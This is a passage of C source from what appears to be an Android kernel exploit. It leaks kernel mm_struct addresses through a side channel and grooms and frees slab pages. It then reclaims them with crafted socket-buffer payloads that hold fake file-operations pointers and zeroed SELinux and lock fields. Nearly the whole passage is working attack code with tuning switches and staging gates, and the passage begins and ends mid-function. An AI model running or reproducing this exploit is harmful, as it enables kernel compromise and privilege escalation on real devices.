            one->mm_struct = match_controlled_mm_page(
                one, current_hint, &match_count);
            if (one->mm_struct != (uintptr_t)-1) {
                one->found = 1;
                one->state = KERNELSNITCH_MM_FOUND;
                if (hint_hit_out)
                    *hint_hit_out = 1;
            } else {
                printf("PAGE_LEAK_NO_PERF_HINT_RETRY base=0x%016zx matches=%zu collisions=%zu t_ms=%" PRIu64 "\n",
                       current_hint, match_count, one->collisions,
                       elapsed_ms());
                close(fd);
                one->state = KERNELSNITCH_MM_NOT_FOUND;
                kernelsnitch_cleanup(one);
                current_hint = 0;
                collision_count = 4;
                continue;
            }
        } else {
            kernelsnitch_bruteforce(one);
        }
        if (one->mm_struct == (uintptr_t)-1) {
            close(fd);
            kernelsnitch_cleanup(one);
            return -2;
        }
        *mm_out = one->mm_struct;
        kernelsnitch_cleanup(one);
        return fd;
    }
    return -2;
}

enum controlled_mm_zone {
    CONTROLLED_MM_INVALID,
    CONTROLLED_MM_DMA32,
    CONTROLLED_MM_NORMAL,
};

static enum controlled_mm_zone controlled_mm_zone(uintptr_t mm)
{
    uintptr_t base = mm & ~(ORDER3_SIZE - 1);

    if (base >= MM_DMA32_ALIAS_START && base < MM_DMA32_ALIAS_END)
        return CONTROLLED_MM_DMA32;
    if (base >= MM_NORMAL_ALIAS_START && base < MM_NORMAL_ALIAS_END)
        return CONTROLLED_MM_NORMAL;
    return CONTROLLED_MM_INVALID;
}

static const char *controlled_mm_zone_name(enum controlled_mm_zone zone)
{
    if (zone == CONTROLLED_MM_DMA32)
        return "dma32";
    if (zone == CONTROLLED_MM_NORMAL)
        return "normal";
    return "invalid";
}

static int valid_controlled_mm(uintptr_t mm)
{
    uintptr_t base = mm & ~(ORDER3_SIZE - 1);
    uintptr_t offset = mm - base;

    return controlled_mm_zone(mm) != CONTROLLED_MM_INVALID &&
        offset < ORDER3_SIZE && offset % MM_STRUCT_SZ == 0;
}

static int flush_target_rotate_no_perf(uintptr_t base, size_t batch,
                                       unsigned long max_refs,
                                       size_t cpu_count)
{
    int *target_fds = calloc(batch, sizeof(*target_fds));
    uintptr_t *target_ptrs = calloc(batch, sizeof(*target_ptrs));
    unsigned long attempts = 0;
    size_t target_count = 0;

    if (!target_fds || !target_ptrs)
        die("calloc no-perf target rotate");
    while (attempts++ < max_refs && target_count < batch) {
        uintptr_t mm = 0;
        uintptr_t candidate_base;
        size_t slot;
        int fd = leak_one_controlled_mm(cpu_count, base, &mm, NULL);

        if (fd == -2)
            continue;
        if (fd < 0)
            break;
        if (!valid_controlled_mm(mm)) {
            check_int(close(fd), "close invalid no-perf target");
            continue;
        }
        candidate_base = mm & ~(ORDER3_SIZE - 1);
        slot = (mm - candidate_base) / MM_STRUCT_SZ;
        printf("PAGE_LEAK_NO_PERF_ALLOC attempt=%lu mm=0x%016zx base=0x%016zx slot=%zu hit=%d\n",
               attempts, mm, candidate_base, slot, candidate_base == base);
        if (candidate_base != base || slot >= batch) {
            check_int(close(fd), "close no-perf non-target");
            continue;
        }
        {
            int duplicate = 0;
            for (size_t i = 0; i < target_count; ++i) {
                if (target_ptrs[i] == mm) {
                    duplicate = 1;
                    break;
                }
            }
            if (duplicate) {
                check_int(close(fd), "close no-perf duplicate");
                continue;
            }
        }
        target_fds[target_count] = fd;
        target_ptrs[target_count] = mm;
        target_count++;
    }
    printf("PAGE_LEAK_NO_PERF_TARGET count=%zu need=%zu attempts=%lu base=0x%016zx\n",
           target_count, batch, attempts ? attempts - 1 : 0, base);
    if (target_count != batch) {
        for (size_t i = 0; i < target_count; ++i)
            check_int(close(target_fds[i]), "close incomplete no-perf target");
        free(target_ptrs);
        free(target_fds);
        return 0;
    }
    if (getenv("PAGE_LEAK_NO_PERF_TARGET_DRY")) {
        for (size_t i = 0; i < target_count; ++i)
            check_int(close(target_fds[i]), "close dry no-perf target");
        free(target_ptrs);
        free(target_fds);
        return 1;
    }
    for (size_t i = 0; i < target_count; ++i)
        check_int(close(target_fds[i]), "close no-perf target");
    free(target_ptrs);
    free(target_fds);
    return 1;
}

static int collect_no_perf_full_group(size_t batch, unsigned long max_refs,
                                      size_t cpu_count, uintptr_t *base_out,
                                      int *chosen_fds)
{
    const size_t max_groups = 64;
    int fast_skip_dma32 =
        getenv("PAGE_LEAK_NO_PERF_FAST_SKIP_DMA32") != NULL;
    unsigned long dma32_skip_slabs = fast_skip_dma32 ?
        env_ulong("PAGE_LEAK_NO_PERF_DMA32_SKIP_SLABS", 8) : 0;
    uintptr_t *group_bases = calloc(max_groups, sizeof(*group_bases));
    size_t *group_counts = calloc(max_groups, sizeof(*group_counts));
    int *group_fds = calloc(max_groups * batch, sizeof(*group_fds));
    unsigned char *group_seen = calloc(max_groups * batch,
                                       sizeof(*group_seen));
    size_t opaque_capacity = 0;
    int *opaque_fds;
    size_t opaque_count = 0;
    size_t group_count = 0;
    size_t chosen_group = max_groups;
    size_t hint_hits = 0;
    size_t hint_misses = 0;
    uintptr_t hint_base = 0;
    unsigned long chosen_attempt = 0;
    int result = 0;

    if (fast_skip_dma32) {
        if (fast_skip_dma32 &&
            (!dma32_skip_slabs || dma32_skip_slabs > SIZE_MAX / batch))
            die("no-perf dma32 skip slabs");
        if (max_refs > SIZE_MAX / batch)
            die("no-perf opaque skip size");
        opaque_capacity = (size_t)max_refs * batch;
    }
    opaque_fds = opaque_capacity ?
        malloc(opaque_capacity * sizeof(*opaque_fds)) : NULL;
    if (!group_bases || !group_counts || !group_fds || !group_seen ||
        (opaque_capacity && !opaque_fds))
        die("calloc no-perf groups");
    if (chosen_fds)
        for (size_t i = 0; i < batch; ++i)
            chosen_fds[i] = -1;
    for (size_t i = 0; i < max_groups * batch; ++i)
        group_fds[i] = -1;
    printf("PAGE_LEAK_NO_PERF_GROUP_SEARCH max_scans=%lu target_zone=normal fast_skip_dma32=%d dma32_skip_slabs=%lu opaque_ref_limit=%zu t_ms=%" PRIu64 "\n",
           max_refs, fast_skip_dma32, dma32_skip_slabs, opaque_capacity,
           elapsed_ms());
    for (unsigned long attempt = 1;
         attempt <= max_refs && !result; ++attempt) {
        uintptr_t mm = 0;
        uintptr_t base;
        size_t slot;
        size_t group = max_groups;
        int hint_hit = 0;
        int fd = leak_one_controlled_mm(cpu_count, hint_base, &mm,
                                        &hint_hit);

        if (fd == -2)
            continue;
        if (fd < 0)
            break;
        if (hint_base) {
            if (hint_hit)
                hint_hits++;
            else
                hint_misses++;
        }
        if (!valid_controlled_mm(mm)) {
            check_int(close(fd), "close invalid no-perf group");
            continue;
        }
        base = mm & ~(ORDER3_SIZE - 1);
        slot = (mm - base) / MM_STRUCT_SZ;
        if (slot >= batch) {
            check_int(close(fd), "close no-perf group bad slot");
            continue;
        }
        if (fast_skip_dma32 &&
            controlled_mm_zone(base) == CONTROLLED_MM_DMA32) {
            size_t skip_refs = (size_t)dma32_skip_slabs * batch;
            size_t remaining = opaque_capacity - opaque_count;

            if (remaining < batch) {
                check_int(close(fd), "close dma32 limit candidate");
                printf("PAGE_LEAK_NO_PERF_DMA32_LIMIT attempt=%lu base=0x%016zx total_held=%zu limit=%zu t_ms=%" PRIu64 "\n",
                       attempt, base, opaque_count, opaque_capacity,
                       elapsed_ms());
                break;
            }
            if (skip_refs > remaining)
                skip_refs = remaining - remaining % batch;
            opaque_fds[opaque_count++] = fd;
            pin_to_core(0);
            for (size_t i = 1; i < skip_refs; ++i)
                opaque_fds[opaque_count++] = clone_memfd();
            printf("PAGE_LEAK_NO_PERF_DMA32_SKIP attempt=%lu base=0x%016zx slot=%zu slabs=%zu held=%zu total_held=%zu t_ms=%" PRIu64 "\n",
                   attempt, base, slot, skip_refs / batch, skip_refs,
                   opaque_count, elapsed_ms());
            hint_base = 0;
            continue;
        }
        hint_base = base;
        for (size_t i = 0; i < group_count; ++i) {
            if (group_bases[i] == base) {
                group = i;
                break;
            }
        }
        if (group == max_groups && group_count < max_groups) {
            group = group_count++;
            group_bases[group] = base;
        }
        if (group == max_groups || group_seen[group * batch + slot]) {
            check_int(close(fd), "close no-perf group duplicate");
            continue;
        }
        group_seen[group * batch + slot] = 1;
        group_fds[group * batch + slot] = fd;
        group_counts[group]++;
        if (getenv("PAGE_LEAK_VERBOSE") || group_counts[group] == 1 ||
            group_counts[group] % 8 == 0 || group_counts[group] + 1 >= batch)
            printf("PAGE_LEAK_NO_PERF_GROUP attempt=%lu group=%zu base=0x%016zx zone=%s slot=%zu count=%zu t_ms=%" PRIu64 "\n",
                   attempt, group, base,
                   controlled_mm_zone_name(controlled_mm_zone(base)), slot,
                   group_counts[group], elapsed_ms());
        if (group_counts[group] == batch) {
            if (controlled_mm_zone(base) != CONTROLLED_MM_NORMAL) {
                printf("PAGE_LEAK_NO_PERF_GROUP_REJECT group=%zu base=0x%016zx zone=%s reason=skb-zone-mismatch held=%zu t_ms=%" PRIu64 "\n",
                       group, base,
                       controlled_mm_zone_name(controlled_mm_zone(base)),
                       group_counts[group], elapsed_ms());
                continue;
            }
            chosen_group = group;
            chosen_attempt = attempt;
            *base_out = base;
            result = 1;
        }
    }
    pin_to_core(0);
    if (result) {
        for (size_t group = 0; group < group_count; ++group) {
            for (size_t slot = 0; slot < batch; ++slot) {
                int fd = group_fds[group * batch + slot];
                if (fd < 0)
                    continue;
                if (group == chosen_group && chosen_fds) {
                    chosen_fds[slot] = fd;
                    group_fds[group * batch + slot] = -1;
                    continue;
                }
                check_int(close(fd), "close no-perf group");
                group_fds[group * batch + slot] = -1;
            }
        }
        printf("PAGE_LEAK_NO_PERF_GROUP_FULL group=%zu base=0x%016zx zone=%s attempts=%lu groups=%zu t_ms=%" PRIu64 "\n",
               chosen_group, *base_out,
               controlled_mm_zone_name(controlled_mm_zone(*base_out)),
               chosen_attempt, group_count, elapsed_ms());
    } else {
        printf("PAGE_LEAK_NO_PERF_GROUP_FAIL groups=%zu max=%lu target_zone=normal t_ms=%" PRIu64 "\n",
               group_count, max_refs, elapsed_ms());
        for (size_t group = 0; group < group_count; ++group)
            for (size_t slot = 0; slot < batch; ++slot)
                if (group_fds[group * batch + slot] >= 0)
                    check_int(close(group_fds[group * batch + slot]),
                              "close incomplete no-perf group");
    }
    for (size_t i = 0; i < opaque_count; ++i)
        check_int(close(opaque_fds[i]), "close no-perf dma32 skip");
    printf("PAGE_LEAK_NO_PERF_GROUP_HINT hits=%zu misses=%zu t_ms=%" PRIu64
           "\n", hint_hits, hint_misses, elapsed_ms());
    free(opaque_fds);
    free(group_seen);
    free(group_fds);
    free(group_counts);
    free(group_bases);
    return result;
}

static int drain_no_perf_group(int *target_fds, size_t batch)
{
    unsigned long trigger_pages = env_ulong(
        "PAGE_LEAK_NO_PERF_TRIGGER_PAGES", 14);
    size_t trigger_refs;
    int *trigger_fds;
    int s2;

    if (!trigger_pages || trigger_pages > SIZE_MAX / batch)
        return 0;
    trigger_refs = (size_t)trigger_pages * batch;
    trigger_fds = calloc(trigger_refs, sizeof(*trigger_fds));
    if (!trigger_fds)
        die("calloc no-perf triggers");
    for (size_t i = 0; i < trigger_refs; ++i)
        trigger_fds[i] = clone_memfd();
    s2 = clone_memfd();
    printf("PAGE_LEAK_NO_PERF_TRIGGER_READY pages=%lu refs=%zu s2=%d cpu=%d\n",
           trigger_pages, trigger_refs, s2, sched_getcpu());
    wait_before_s1();
    for (size_t i = 0; i + 1 < batch; ++i)
        check_int(close(target_fds[i]), "close no-perf target");
    {
        unsigned long wait_ms = env_ulong("PAGE_LEAK_NO_PERF_TARGET_WAIT_MS", 0);

        if (wait_ms) {
            printf("PAGE_LEAK_NO_PERF_TARGET_WAIT ms=%lu\n", wait_ms);
            usleep(wait_ms * 1000);
        }
    }
    printf("PAGE_LEAK_NO_PERF_TARGET_FREED refs=%zu held=1 cpu=%d\n",
           batch - 1, sched_getcpu());
    wait_before_post_trigger();
    for (unsigned long page = 0; page < trigger_pages; ++page)
        check_int(close(trigger_fds[(size_t)page * batch]),
                  "close no-perf trigger head");
    for (unsigned long page = 0; page < trigger_pages; ++page) {
        for (size_t i = 1; i < batch; ++i)
            check_int(close(trigger_fds[(size_t)page * batch + i]),
                      "close no-perf trigger");
    }
    check_int(close(s2), "close no-perf s2");
    check_int(close(target_fds[batch - 1]), "close no-perf target tail");
    free(trigger_fds);
    printf("PAGE_LEAK_NO_PERF_TARGET_TAIL_FREE cpu=%d\n", sched_getcpu());
    printf("PAGE_LEAK_NO_PERF_TRIGGER_DONE pages=%lu cpu=%d\n",
           trigger_pages, sched_getcpu());
    return 1;
}

static void hold_probe(void)
{
    unsigned long seconds = env_ulong("PAGE_LEAK_HOLD_SEC", 45);
    const char *release = getenv("PAGE_LEAK_RELEASE_PATH");
    for (unsigned long i = 0; i < seconds; ++i) {
        if (release && *release && access(release, F_OK) == 0)
            break;
        sleep(1);
    }
}

static void wait_before_skb(void)
{
    const char *path = "/data/local/tmp/clean-oracle-run/skb-go";

    if (!getenv("PAGE_LEAK_WAIT_BEFORE_SKB"))
        return;
    printf("PAGE_LEAK_SKB_WAIT path=%s\n", path);
    fflush(stdout);
    while (access(path, F_OK) != 0)
        sleep(1);
    unlink(path);
    printf("PAGE_LEAK_SKB_GO\n");
    fflush(stdout);
}

static void wait_before_s1(void)
{
    const char *path = "/data/local/tmp/clean-oracle-run/s1-go";

    if (!getenv("PAGE_LEAK_WAIT_BEFORE_S1"))
        return;
    printf("PAGE_LEAK_S1_WAIT path=%s\n", path);
    fflush(stdout);
    while (access(path, F_OK) != 0)
        sleep(1);
    unlink(path);
    printf("PAGE_LEAK_S1_GO\n");
    fflush(stdout);
}

static void wait_before_post_trigger(void)
{
    const char *path = "/data/local/tmp/clean-oracle-run/post-trigger-go";

    if (!getenv("PAGE_LEAK_WAIT_BEFORE_POST_TRIGGER"))
        return;
    printf("PAGE_LEAK_POST_TRIGGER_WAIT path=%s\n", path);
    fflush(stdout);
    while (access(path, F_OK) != 0)
        sleep(1);
    unlink(path);
    printf("PAGE_LEAK_POST_TRIGGER_GO\n");
    fflush(stdout);
}

static int gate_candidate(uintptr_t base)
{
    const char *go_path = "/data/local/tmp/clean-oracle/page-go";
    const char *abort_path = "/data/local/tmp/clean-oracle/page-abort";
    unsigned long timeout = env_ulong("PAGE_LEAK_GATE_TIMEOUT_SEC", 0);
    unsigned long waited = 0;

    if (getenv("PAGE_LEAK_AUTO_GO"))
        return 1;
    printf("PAGE_LEAK_GATE base=0x%016zx go=%s\n", base, go_path);
    fflush(stdout);
    for (;;) {
        FILE *file;
        char line[128];
        char *end = NULL;
        unsigned long long approved;

        if (access(abort_path, F_OK) == 0)
            return 0;
        file = fopen(go_path, "r");
        if (file) {
            if (fgets(line, sizeof(line), file)) {
                errno = 0;
                approved = strtoull(line, &end, 0);
                if (!errno && end != line && approved == base) {
                    fclose(file);
                    unlink(go_path);
                    return 1;
                }
            }
            fclose(file);
            unlink(go_path);
        }
        if (timeout && waited++ >= timeout)
            return 0;
        sleep(1);
    }
}

int a536_probe_main(void)
{
    struct mm_ctx prep;
    struct mm_ctx spray;
    struct mm_ctx pre;
    struct mm_ctx post;
    struct kernelsnitch_shared_state *ks;
    struct kernelsnitch_shared_state *ks_second = NULL;
    size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
    int pcp_sv[2] = {-1, -1};
    int skb_sv[2] = {-1, -1};
    int leak_memfd = -1;
    pid_t leak_child = -1;
    unsigned char *blob;
    uintptr_t leaked;
    uintptr_t leaked_second = (uintptr_t)-1;
    uintptr_t base;
    uintptr_t payload;
    long cpu_count;
    int status;
    int calibrate = getenv("PAGE_LEAK_CALIBRATE") != NULL;
    int no_perf = getenv("PAGE_LEAK_NO_PERF") != NULL;
    int group_calibrate = getenv("PAGE_LEAK_GROUP_CALIBRATE") != NULL;
    int validate_only = getenv("PAGE_LEAK_VALIDATE_ONLY") != NULL;
    int dual = getenv("PAGE_LEAK_DUAL") != NULL;
    int keep_leak_child = getenv("PAGE_LEAK_KEEP_LEAK_CHILD") != NULL;
    int keep_prep_children = getenv("PAGE_LEAK_KEEP_PREP_CHILDREN") != NULL;
    int defer_spray_close = getenv("PAGE_LEAK_DEFER_SPRAY_CLOSE") != NULL;
    int skb_reclaim = getenv("PAGE_LEAK_SKB_RECLAIM") != NULL;
    int perf_defer_stop = getenv("PAGE_LEAK_PERF_DEFER_STOP") != NULL;
    int brute_before_skb = getenv("PAGE_LEAK_BRUTE_BEFORE_SKB") != NULL;
    int group_free_confirmed = 1;
    int defer_bruteforce =
        getenv("PAGE_LEAK_BRUTE_AFTER_RECLAIM") != NULL ||
        brute_before_skb;
    int perf_ready = 0;
    struct perf_capture perf;

    probe_start_ms = monotonic_ms();
    set_unbuffer();
    set_limit();
    set_proc_name("rmg-page-leak");
    if (getenv("PAGE_LEAK_CPU"))
        pin_to_core(0);
    printf("PAGE_LEAK_START calibrate=%d no_perf=%d validate_only=%d dual=%d "
           "keep_prep=%d defer_spray=%d pin_children=%d "
           "pid=%d t_ms=%" PRIu64 "\n",
           calibrate, no_perf, validate_only, dual, keep_prep_children,
           defer_spray_close,
           getenv("PAGE_LEAK_PIN_CHILDREN") != NULL,
           getpid(), elapsed_ms());
    if (calibrate && (!no_perf || group_calibrate) &&
        !getenv("PAGE_LEAK_PERF_LATE")) {
        perf_ready = getenv("PAGE_LEAK_PERF_KMEM_ONLY") ?
            perf_capture_start_kmem(&perf) : perf_capture_start(&perf);
        if (!perf_ready)
            return 5;
    }
    ctx_init(&prep, 32 * objs_per_slab);
    ctx_init(&spray, (1 + MM_PARTIALS) * objs_per_slab);
    ctx_init(&pre, objs_per_slab - 1);
    ctx_init(&post, objs_per_slab);
    printf("PAGE_LEAK_BEGIN objs=%zu contexts=%zu/%zu/%zu/%zu t_ms=%" PRIu64 "\n",
           objs_per_slab, prep.count, spray.count, pre.count, post.count,
           elapsed_ms());

    for (size_t i = 0; i < prep.count; ++i) {
        if (keep_prep_children) {
            prep.children[i] = spawn_prep_child();
            prep.memfds[i] = open_mem(prep.children[i]);
        } else {
            prep.memfds[i] = clone_memfd();
        }
        if (perf_ready && (i & 63) == 63)
            perf_capture_drain(&perf);
    }
    for (size_t i = 0; i < spray.count; ++i) {
        spray.memfds[i] = clone_memfd();
        if (perf_ready && (i & 63) == 63)
            perf_capture_drain(&perf);
    }

    cpu_count = sysconf(_SC_NPROCESSORS_ONLN);
    if (cpu_count < 1)
        die("sysconf");
    ks = kernelsnitch_setup(MM_STRUCT_SZ, MM_ORDER, (size_t)cpu_count, 4,
                             getenv("PAGE_LEAK_VERBOSE") ? 1 : 0, 0);
    if (!ks)
        die("kernelsnitch_setup");
    printf("PAGE_LEAK_KS cpus=%ld threads=%zu collisions=%zu\n",
           cpu_count, ks->thread_cnt, ks->collisions);
    if (dual) {
        ks_second = kernelsnitch_setup(
            MM_STRUCT_SZ, MM_ORDER, (size_t)cpu_count, 4,
            getenv("PAGE_LEAK_VERBOSE") ? 1 : 0, 0);
        if (!ks_second)
            die("kernelsnitch_setup second");
        printf("PAGE_LEAK_KS_SECOND cpus=%ld threads=%zu collisions=%zu\n",
               cpu_count, ks_second->thread_cnt, ks_second->collisions);
    }

    for (size_t i = 0; i < pre.count; ++i)
        pre.children[i] = spawn_paused();
    leak_child = dual ? spawn_collision_dual(ks, ks_second) :
                       spawn_collision(ks);
    if (perf_ready)
        perf_capture_drain(&perf);
    for (size_t i = 0; i < post.count; ++i)
        post.children[i] = spawn_paused();
    if (perf_ready)
        perf_capture_drain(&perf);
    for (size_t i = 0; i < pre.count; ++i)
        pre.memfds[i] = open_mem(pre.children[i]);
    leak_memfd = open_mem(leak_child);
    for (size_t i = 0; i < post.count; ++i)
        post.memfds[i] = open_mem(post.children[i]);

    for (size_t i = 0; i < pre.count; ++i)
        reap_child(pre.children[i]), pre.children[i] = -1;
    for (size_t i = 0; i < post.count; ++i)
        reap_child(post.children[i]), post.children[i] = -1;
    if (!defer_spray_close) {
        for (size_t i = 0; i < spray.count; ++i)
            close(spray.memfds[i]), spray.memfds[i] = -1;
    }
    if (keep_leak_child) {
        check_int(waitpid(leak_child, &status, WUNTRACED),
                  "wait collision stop");
        if (!WIFSTOPPED(status)) {
            fprintf(stderr, "PAGE_LEAK_COLLISION_TARGET_DIED status=%d\n",
                    status);
            return 2;
        }
        status = 0;
    } else {
        check_int(waitpid(leak_child, &status, 0), "wait collision");
        leak_child = -1;
    }
    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0 ||
        !kernelsnitch_found_collisions(ks) ||
        (dual && !kernelsnitch_found_collisions(ks_second))) {
        fprintf(stderr, "PAGE_LEAK_COLLISIONS_FAIL status=%d state=%d\n",
                status, ks->state);
        if (perf_ready)
            perf_capture_stop(&perf);
        return 2;
    }
    printf("PAGE_LEAK_COLLISIONS_OK\n");

    if (defer_bruteforce &&
        (dual || validate_only || !getenv("PAGE_LEAK_FREE_ONLY") ||
         !skb_reclaim)) {
        fprintf(stderr,
                "PAGE_LEAK_BRUTE_AFTER_RECLAIM_UNSUPPORTED mode\n");
        return 8;
    }
    if (!defer_bruteforce) {
        kernelsnitch_bruteforce(ks);
        leaked = ks->mm_struct;
        if (leaked == (uintptr_t)-1) {
            fprintf(stderr, "PAGE_LEAK_MM_FAIL\n");
            if (perf_ready)
                perf_capture_stop(&perf);
            return 3;
        }
        if (dual) {
            kernelsnitch_bruteforce(ks_second);
            leaked_second = ks_second->mm_struct;
            printf("PAGE_LEAK_CONSENSUS first=0x%016zx second=0x%016zx equal=%d\n",
                   leaked, leaked_second, leaked == leaked_second);
            if (leaked_second == (uintptr_t)-1 || leaked != leaked_second) {
                fprintf(stderr, "PAGE_LEAK_CONSENSUS_FAIL\n");
                if (perf_ready)
                    perf_capture_stop(&perf);
                kernelsnitch_cleanup(ks);
                kernelsnitch_cleanup(ks_second);
                return 7;
            }
        }
        base = leaked & ~(ORDER3_SIZE - 1);
        payload = (uintptr_t)base;
        printf("PAGE_LEAK_CANDIDATE mm=0x%016zx base=0x%016zx payload=0x%016zx\n",
               leaked, base, payload);
        print_ks_details(ks, leaked);
        if (calibrate && (!no_perf || group_calibrate) && !perf_ready &&
            getenv("PAGE_LEAK_PERF_LATE")) {
            perf_ready = getenv("PAGE_LEAK_PERF_KMEM_ONLY") ?
                perf_capture_start_kmem(&perf) : perf_capture_start(&perf);
            if (!perf_ready)
                return 5;
            printf("PAGE_CALIBRATION_PERF_LATE_START base=0x%016zx\n", base);
        }
        if (perf_ready && !perf_defer_stop) {
            perf_capture_stop(&perf);
            if (!perf_candidate_match(&perf, leaked, base)) {
                fprintf(stderr,
                        "PAGE_CALIBRATION_REJECT candidate_not_in_perf\n");
                return 4;
            }
            printf("PAGE_CALIBRATION_ACCEPT candidate_perf_confirmed=1\n");
        }
    } else if (calibrate && (!no_perf || group_calibrate) && !perf_ready) {
        perf_ready = getenv("PAGE_LEAK_PERF_KMEM_ONLY") ?
            perf_capture_start_kmem(&perf) : perf_capture_start(&perf);
        if (!perf_ready)
            return 5;
        printf("PAGE_CALIBRATION_PERF_RECLAIM_START\n");
    }
    if (validate_only) {
        printf("PAGE_LEAK_VALIDATE_ONLY_STOP mm=0x%016zx base=0x%016zx\n",
               leaked, base);
        fflush(stdout);
        if (getenv("PAGE_LEAK_VALIDATE_HOLD"))
            hold_probe();
        kernelsnitch_cleanup(ks);
        if (ks_second)
            kernelsnitch_cleanup(ks_second);
        if (leak_child > 0)
            reap_child(leak_child);
        close_ctx(&prep);
        close_ctx(&spray);
        close_ctx(&pre);
        close_ctx(&post);
        return 0;
    }
    if (getenv("PAGE_LEAK_FREE_ONLY")) {
        /*
         * Bridge integration mode: report the mm slab base, free the mm
         * contexts so the slab returns to the buddy, then hold.  The bridge
         * faults its own pages during the hold; the physmap alias of the
         * freed slab (base) is the predicted address of the reclaimed page.
         */
        if (skb_reclaim) {
            blob = malloc(SKB_SEND_SIZE);
            if (!blob)
                die("malloc skb reclaim blob");
            memset(blob, 0x50, SKB_SEND_SIZE);
            memcpy(blob + 0x0e80, "RMG-CLEAN-PAGE", 14);
            memcpy(blob + ORDER3_SIZE + 0x0e80,
                   "RMG-CLEAN-PAGE", 14);
            if (getenv("PAGE_LEAK_SKB_FOPS")) {
                const char *raw_slide = getenv("PAGE_LEAK_FOPS_SLIDE");
                char *end = NULL;
                uint64_t slide = 0;

                if (!raw_slide || !*raw_slide) {
                    errno = EINVAL;
                    die("PAGE_LEAK_FOPS_SLIDE");
                }
                errno = 0;
                slide = strtoull(raw_slide, &end, 0);
                if (errno || end == raw_slide || *end) {
                    errno = EINVAL;
                    die("PAGE_LEAK_FOPS_SLIDE");
                }
                for (size_t chunk = 0; chunk < SKB_SEND_SIZE;
                     chunk += ORDER3_SIZE) {
                    memset(blob + chunk + SKB_PAYLOAD_OFFSET, 0,
                           FOPS_OFFSET);
                    memset(blob + chunk + SKB_PAYLOAD_OFFSET +
                               SKB_USERCOPY_LOCK_OFF,
                           0, SKB_USERCOPY_VALUE_OFF -
                               SKB_USERCOPY_LOCK_OFF + sizeof(uint64_t));
                    memset(blob + chunk + SKB_PAYLOAD_OFFSET +
                               SKB_SELINUX_LOCK_OFF,
                           0, 0x20);
                    memset(blob + chunk + SKB_PAYLOAD_OFFSET +
                               SKB_OWNER_LOCK_OFF,
                           0, 0x20);
                }
                fill_skb_fops(blob, slide);
                blob_put64(blob, SKB_PAYLOAD_OFFSET + 0x800,
                           0x4135333652454144ULL);
                blob_put64(blob, ORDER3_SIZE + SKB_PAYLOAD_OFFSET + 0x800,
                           0x4135333652454144ULL);
                printf("PAGE_LEAK_SKB_FOPS_READY slide=%#llx\n",
                       (unsigned long long)slide);
            }
            printf("PAGE_LEAK_SKB_GEOMETRY send_size=%u head=%u frag_order=%u frag_size=%u t_ms=%" PRIu64 "\n",
                   SKB_SEND_SIZE, SKB_DATA_HEAD_SIZE, SKB_RECLAIM_ORDER,
                   SKB_RECLAIM_SIZE, elapsed_ms());
            check_int(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv),
                      "socketpair reclaim pcp");
            check_int(socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv),
                      "socketpair reclaim skb");
            {
                unsigned long requested = env_ulong(
                    "PAGE_LEAK_SKB_SNDBUF", 1 << 20);
                int sndbuf;
                socklen_t sndbuf_len = sizeof(sndbuf);

                if (requested > INT_MAX)
                    die("bad reclaim skb sndbuf");
                sndbuf = (int)requested;
                check_int(setsockopt(skb_sv[0], SOL_SOCKET, SO_SNDBUF,
                                     &sndbuf, sizeof(sndbuf)),
                          "setsockopt reclaim skb sndbuf");
                check_int(getsockopt(skb_sv[0], SOL_SOCKET, SO_SNDBUF,
                                     &sndbuf, &sndbuf_len),
                          "getsockopt reclaim skb sndbuf");
                printf("PAGE_LEAK_SKB_SNDBUF requested=%lu actual=%d\n",
                       requested, sndbuf);
            }
            send_blob(pcp_sv[0], blob);
            printf("PAGE_LEAK_PCP_SENT\n");
            pin_to_core(0);
        }
        if (getenv("PAGE_LEAK_DRAIN_SPRAY_STRIDE")) {
            size_t drained = 0;
            for (size_t i = 0; i < spray.count; i += objs_per_slab) {
                if (spray.memfds[i] >= 0) {
                    close(spray.memfds[i]);
                    spray.memfds[i] = -1;
                    drained++;
                }
            }
            printf("PAGE_LEAK_SPRAY_STRIDE_DRAIN slabs=%zu\n", drained);
        }
        if (skb_reclaim) {
            size_t target_pre = pre.count - 1;
            if (pre.memfds[target_pre] >= 0) {
                close(pre.memfds[target_pre]);
                pre.memfds[target_pre] = -1;
            }
            if (post.memfds[0] >= 0) {
                close(post.memfds[0]);
                post.memfds[0] = -1;
            }
            for (size_t i = 0; i < target_pre; ++i) {
                if (pre.memfds[i] >= 0) {
                    close(pre.memfds[i]);
                    pre.memfds[i] = -1;
                }
            }
            for (size_t i = 1; i + 1 < post.count; ++i) {
                if (post.memfds[i] >= 0) {
                    close(post.memfds[i]);
                    post.memfds[i] = -1;
                }
            }
            printf("PAGE_LEAK_TARGET_NEIGHBOR_QUEUED post=%zu\n",
                   post.count - 1);
        } else {
            for (size_t i = 0; i < pre.count; ++i) {
                if (pre.memfds[i] >= 0) {
                    close(pre.memfds[i]);
                    pre.memfds[i] = -1;
                }
            }
            for (size_t i = 0; i < post.count; ++i) {
                if (post.memfds[i] >= 0) {
                    close(post.memfds[i]);
                    post.memfds[i] = -1;
                }
            }
        }
        if (skb_reclaim) {
            check_int(close(pcp_sv[0]), "close reclaim pcp0");
            pcp_sv[0] = -1;
            check_int(close(pcp_sv[1]), "close reclaim pcp1");
            pcp_sv[1] = -1;
            for (int i = 0; i < 4; ++i)
                sched_yield();
        }
        if (leak_memfd >= 0) {
            close(leak_memfd);
            leak_memfd = -1;
        }
        if (getenv("PAGE_LEAK_LATE_PREP_DRAIN") || skb_reclaim) {
            size_t drained = 0;
            for (size_t i = 0; i < prep.count; i += objs_per_slab) {
                if (prep.memfds[i] >= 0) {
                    close(prep.memfds[i]);
                    prep.memfds[i] = -1;
                    drained++;
                }
                if (prep.children[i] > 0) {
                    reap_child(prep.children[i]);
                    prep.children[i] = -1;
                }
            }
            printf("PAGE_LEAK_LATE_PREP_DRAIN slabs=%zu\n", drained);
        }
        if (getenv("PAGE_LEAK_DRAIN_PREP") && !skb_reclaim) {
            size_t drained = 0;
            for (size_t i = 0; i < prep.count; ++i) {
                if (prep.memfds[i] >= 0) {
                    close(prep.memfds[i]);
                    prep.memfds[i] = -1;
                    drained++;
                }
                if (prep.children[i] > 0) {
                    reap_child(prep.children[i]);
                    prep.children[i] = -1;
                }
            }
            printf("PAGE_LEAK_PREP_DRAIN refs=%zu\n", drained);
        }
        {
            unsigned long drain_rounds = skb_reclaim ? 0 :
                env_ulong("PAGE_LEAK_DRAIN_ALLOC", 0);
            size_t drained = 0;
